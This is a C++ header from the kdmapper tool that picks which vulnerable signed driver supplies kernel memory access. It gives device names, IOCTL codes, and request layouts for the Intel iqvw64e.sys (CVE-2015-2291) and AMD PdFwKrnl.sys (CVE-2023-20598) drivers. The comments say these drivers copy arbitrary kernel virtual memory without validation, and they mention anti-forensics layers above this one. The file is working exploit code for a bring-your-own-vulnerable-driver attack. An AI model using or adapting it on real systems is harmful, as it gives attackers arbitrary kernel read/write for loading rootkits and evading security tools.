#pragma once
#include <Windows.h>

/*
 * kdmapper vulnerable-driver provider selection.
 *
 * A "provider" is the signed third-party driver that gives kdmapper its kernel
 * read/write + kernel-call primitives. Only the memcpy IOCTL and the device
 * name differ between providers; everything above this layer (mapping,
 * relocations, imports, anti-forensics) is identical.
 *
 * Select exactly one. The embedded driver resource
 * (kdmapper/include/intel_driver_resource.hpp) MUST contain the .sys binary of
 * the selected provider, otherwise service load will fail.
 */

//#define KDM_PROVIDER_INTEL_NAL 1
#define KDM_PROVIDER_AMD_PDFW  1

namespace Provider
{
#ifdef KDM_PROVIDER_INTEL_NAL

    // Intel Network Adapter Diagnostic Driver (iqvw64e.sys) - CVE-2015-2291
    // Known device: \\.\Nal   IOCTL: 0x80862007, case 0x33 = copy between two
    // virtual addresses. Also exposes phys translation (0x25) and MmMapIoSpace
    // style primitives (0x19/0x1A) which intel_driver.cpp uses for read-only
    // page writes.
    constexpr const wchar_t* kDeviceName = L"\\\\.\\Nal";
    constexpr const wchar_t* kShortName = L"Intel NAL";
#pragma pack(push, 1)
    // Virtual memory copy request (arbitrary src/dst user or kernel VA).
    using CopyRequest = struct _COPY_MEMORY_BUFFER_INFO {
        uint64_t case_number;
        uint64_t reserved;
        uint64_t source;
        uint64_t destination;
        uint64_t length;
    };
#pragma pack(pop)
    constexpr uint32_t kCopyIoctl = 0x80862007;
    constexpr uint64_t kCopyCaseNumber = 0x33;
    constexpr bool kHasMapIoSpace = true;

    inline void FillCopyRequest(CopyRequest& request, uint64_t destination, uint64_t source, uint64_t length) {
        request.case_number = kCopyCaseNumber;
        request.reserved = 0;
        request.source = source;
        request.destination = destination;
        request.length = length;
    }

#elif defined(KDM_PROVIDER_AMD_PDFW)

    // AMD USB-C Power Delivery Firmware Update Utility driver (PdFwKrnl.sys)
    // - CVE-2023-20598. Ships with AMD Radeon Software (Adrenalin Edition and
    // PRO Edition), versions up to and including 23.9.1.
    // Known device: \\.\PdFwKrnl  IOCTL: 0x80002014
    // The request carries raw source/destination virtual addresses and is
    // memcpy'd by the driver without validation, so this is a direct virtual
    // (not physical) read/write primitive - a drop-in replacement for the
    // Intel case 0x33 copy.
    constexpr const wchar_t* kDeviceName = L"\\\\.\\PdFwKrnl";
    constexpr const wchar_t* kShortName = L"AMD PdFwKrnl";
#pragma pack(push, 1)
    using CopyRequest = struct _PDFW_MEMCPY {
        BYTE Reserved[16];
        PVOID Destination;
        PVOID Source;
        PVOID Reserved2;
        DWORD Size;
        DWORD Reserved3;
    };
#pragma pack(pop)
    constexpr uint32_t kCopyIoctl = 0x80002014;
    constexpr bool kHasMapIoSpace = false;

    inline void FillCopyRequest(CopyRequest& request, uint64_t destination, uint64_t source, uint64_t length) {
        request.Reserved[0] = 0; //the whole block is zero-initialized by the caller
        request.Destination = (PVOID)destination;
        request.Source = (PVOID)source;
        request.Reserved2 = nullptr;
        request.Size = (DWORD)length;
        request.Reserved3 = 0;
    }

#else
#error "kdmapper: no vulnerable driver provider selected"
#endif
}
